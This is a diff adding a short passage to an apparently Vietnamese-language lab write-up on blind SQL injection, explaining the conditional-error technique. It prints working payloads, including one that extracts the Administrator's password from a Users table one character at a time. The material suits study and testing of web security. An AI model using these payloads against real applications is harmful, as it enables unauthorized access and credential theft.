@@ -444,6 +444,19 @@ print(f"Password is : {password}")
 
 -------------------------------------------------------------------------------------------------------------------
 
+Cách tiếp theo để khai thác lỗ hổng blind sql này là:
+
+- xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a
+
+- xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a
+
+Sử dụng kỹ thuật này ta có thể truy xuất dữ liệu bằng cách kiểm tra từng ký tự một
+
+- xyz' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a'
+
+END FROM Users)='a
+
+
 
 
 
